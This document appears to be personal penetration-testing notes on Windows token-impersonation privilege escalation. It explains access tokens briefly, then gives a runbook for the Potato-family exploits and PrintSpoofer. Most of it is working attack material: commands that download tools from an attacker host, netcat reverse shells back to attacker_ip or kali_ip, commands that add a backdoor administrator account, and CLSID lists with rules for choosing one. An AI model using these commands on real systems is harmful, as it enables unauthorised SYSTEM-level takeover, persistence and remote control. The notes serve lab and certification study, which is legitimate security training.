# Token Impersonation

Token Impersonation = process abuses ability to impersonate another security context
Access token = object created after successful authentication
- contains security context of user/process/thread
- Security context = rules + attributes currently active
- contents = {user SID, group SIDs, privileges, integrity level, token type, logon session info} 

Primary token = token attached to process 
- e.g. user starts `cmd.exe`-> `cmd.exe` gets user's primary token

Impersonation token = token used by thread to temporarily act as another security context
- service/process can impersonate privileged token -> spawn SYSTEM process

Named Pipes = Windows Inter-Process Communication / IPC mechanism.
- allow unrelated processes to:
	- share data
	- transfer data
	- communicate through a pipe-like object

How exploits work with `SeImpersonatePrivilege` 
1. named pipe server created by attacker-controlled process
2. privileged client connects to named pipe
3. server captures authentication context
4. server impersonates client
5. attacker performs actions as that client - ideally `SYSTEM`


```cmd
whoami /priv
```

| Privilege                               | Use                                                 | Exploit                                                                | Priority        |
| --------------------------------------- | --------------------------------------------------- | ---------------------------------------------------------------------- | --------------- |
| `SeImpersonatePrivilege` enabled        | May allow impersonation of a privileged token       | PrintSpoofer, GodPotato, SigmaPotato, JuicyPotato, RoguePotato         | High            |
| `SeAssignPrimaryTokenPrivilege` enabled | May allow assigning a primary token to a process    | JuicyPotato                                                            | High            |
| `SeBackupPrivilege` enabled             | Can read protected files such as registry hives     | Copy `SAM` / `SYSTEM`, dump local hashes                               | High            |
| `SeRestorePrivilege` enabled            | Can write or restore files into protected locations | Replace protected files, service binary abuse, registry/file overwrite | High            |
| `SeDebugPrivilege` enabled              | Can inspect or manipulate privileged processes      | [Mimikatz](../../08-tools/mimikatz.md), process token abuse            | High            |
| `SeLoadDriverPrivilege` enabled         | Can load kernel drivers                             | Vulnerable driver abuse                                                | Medium          |
| `SeTakeOwnershipPrivilege` enabled      | Can take ownership of files/objects                 | Take ownership, modify ACLs, replace files                             | Medium          |
| `SeCreateTokenPrivilege` enabled        | Can create access tokens                            | Advanced token abuse                                                   | Rare / Advanced |
| `SeTcbPrivilege` enabled                | “Act as part of the operating system”               | Advanced token abuse                                                   | Rare / Advanced |

## Exploits

Goal: coerce `NT AUTHORITY\SYSTEM` -> authenticate/connect -> impersonate -> `SYSTEM` shell

|Tool|Notes|
|---|---|
|PrintSpoofer|common older OSCP/lab path|
|RoguePotato|potato variant with network relay/coercion logic|
|JuicyPotato|older Windows versions|
|GodPotato|useful on newer Windows versions|
|SigmaPotato|modern potato-style implementation|
|SweetPotato|collection of potato-style methods|


### PrintSpoofer 

Requirement: `SeImpersonatePrivilege`

[printspoofer executable releases](https://github.com/itm4n/PrintSpoofer/releases)

```bash
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```

```powershell
iwr -uri http://attacker_ip/privesc/windows/PrintSpoofer64.exe -outfile printspoofer.exe

.\printspoofer.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

whoami
nt authority\system
```



### GodPotato

Requirement: `SeImpersonatePrivilege`

[GodPotato Git Repo Exe Releases](https://github.com/BeichenDream/GodPotato/releases/)

```bash
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```

```bash
└─$ nc -nvlp 443
Connection received on alice_IP 57940

C:\Windows\system32>whoami
```

```powershell
iwr -uri http://attacker_ip/privesc/windows/GodPotato-NET4.exe -outfile gp.exe

.\gp -cmd "cmd /c whoami"
...
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1364
nt authority\system

iwr -uri http://attacker_ip/nc64.exe -outfile nc.exe

.\gp.exe -cmd "C:\Users\public\nc.exe attacker_ip 443 -e cmd"
```



### SigmaPotato  

Requirement: `SeImpersonatePrivilege`

[SigmaPotato Git repo Exe Release](https://github.com/tylerdotrar/SigmaPotato/releases)
[netcat exe for windows releases](https://github.com/int0x33/nc.exe/)

```bash
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```


```powershell
iwr -uri http://attacker_ip/privesc/windows/SigmaPotato.exe -outfile SigmaPotato.exe

.\SigmaPotato "net user kira kira_pw /add"  
net user  
  
.\SigmaPotato "net localgroup Administrators kira /add"  
net localgroup Administrators  
``` 



### JuicyPotato

Requirement: `SeImpersonatePrivilege` OR `SeAssignPrimaryTokenPrivilege`

Legacy potato exploit working on: 
```text
Windows 7  
Windows 8  
Windows 10 before 1809  
Windows Server 2008  
Windows Server 2012  
Windows Server 2016
```

```cmd
systeminfo
```

[JuicyPotato Git Repo Exe Releases](https://github.com/ohpe/juicy-potato/releases)
[netcat exe for windows releases](https://github.com/int0x33/nc.exe/)

```bash
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```

```bash
└─$ nc -nvlp 443
Connection received on alice_IP 57940

C:\Windows\system32>whoami
nt authority\system
```

```powershell
iwr -uri http://attacker_ip/privesc/windows/JuicyPotato.exe -outfile JuicyPotato.exe

JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *

JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators exam_user /add" -t *
```

CLSIDs are used to trigger COM/DCOM behavior - JP often requires CLSID
```powershell
JuicyPotato.exe -l 1337 -c "{CLSID}" -p C:\Windows\System32\cmd.exe -a "/c whoami" -t *

iwr -uri http://attacker_ip/nc64.exe -outfile nc.exe

JuicyPotato.exe -l 1337 -c "{CLSID}" -p C:\Windows\System32\cmd.exe -a "/c C:\Users\alice\nc.exe -e cmd kira_IP 443" -t *
```

Get list of CLSID by Windows OS version on [jp repo CLSID list](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

```text
# Quick copy list CLSIDs 
{4991d34b-80a1-4291-83b6-3328366b9097}
{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}
{03ca98d6-ff5d-49b8-abc6-03dd84127020}
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
{b8fc52f5-cb03-4e10-8bcb-e3ec794c54a5}
```

IF target is Windows Server 2016:  
    try BITS CLSID first  
    try wuauserv CLSIDs  
    try known lab fallback CLSIDs  
    if fail -> use JuicyPotato OS-specific CLSID list  
  
IF target is Windows 10 pre-1809:  
    try BITS CLSID  
    try Enterprise App Management CLSID  
    try OS-specific CLSID list  
  
IF target is Server 2019 / Windows 10 1809+:  
    skip JuicyPotato first  
    try PrintSpoofer / GodPotato / SigmaPotato / RoguePotato  
  
IF one CLSID fails:  
    do not assume JuicyPotato impossible  
    try another CLSID  
    check port/listener  
    check privilege  
    check OS version

| CLSID                                    | Common Association / Notes                                               | Use                                                     |
| ---------------------------------------- | ------------------------------------------------------------------------ | ------------------------------------------------------- |
| `{4991d34b-80a1-4291-83b6-3328366b9097}` | BITS / Background Intelligent Transfer Service                           | common first try on older Windows / Server 2016         |
| `{e60687f7-01a1-40aa-86ac-db1cbf673334}` | BITS-related candidate seen in JuicyPotato lists                         | try if BITS default fails                               |
| `{03ca98d6-ff5d-49b8-abc6-03dd84127020}` | commonly referenced JuicyPotato CLSID candidate                          | good fallback candidate in labs                         |
| `{FFE1E5FE-F1F0-48C8-953E-72BA272F2744}` | Enterprise App Management Service / `IEnterpriseModernAppManager`        | useful candidate in some Windows 10/Server environments |
| `{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}` | Windows Update / `wuauserv`-related candidate in Server 2016 CLSID lists | try on Server 2016-style targets                        |
| `{b8fc52f5-cb03-4e10-8bcb-e3ec794c54a5}` | Windows Update / `wuauserv`-related candidate in Server 2016 CLSID lists | try on Server 2016-style targets                        |
| `{c49e32c6-bc8b-11d2-85d4-00105a1f8304}` | older COM candidate often seen in JuicyPotato notes                      | try on older Windows versions                           |
| `{e36dcbd5-f88b-4d54-9f8c-0f5d8a3c5e1b}` | JuicyPotato-style candidate                                              | fallback if common ones fail                            |



### RoguePotato

Requirement: `SeImpersonatePrivilege` + target is Windows 10 1809+ / Server 2019-ish

```bash
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```

```bash
└─$ nc -nvlp 443
Connection received on alice_IP 57940

C:\Windows\system32>whoami
nt authority\system
```

```powershell 
iwr -uri http://attacker_ip/privesc/windows/RoguePotato.exe -outfile RoguePotato.exe

RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\Users\Public\whoami.txt" -l 9999

type C:\Users\Public\whoami.txt
nt authority\system

iwr -uri http://attacker_ip/nc64.exe -outfile nc.exe

RoguePotato.exe -r kali_ip -e "cmd /c C:\Users\Public\nc.exe -e cmd kali_ip 4444" -l 9999
```

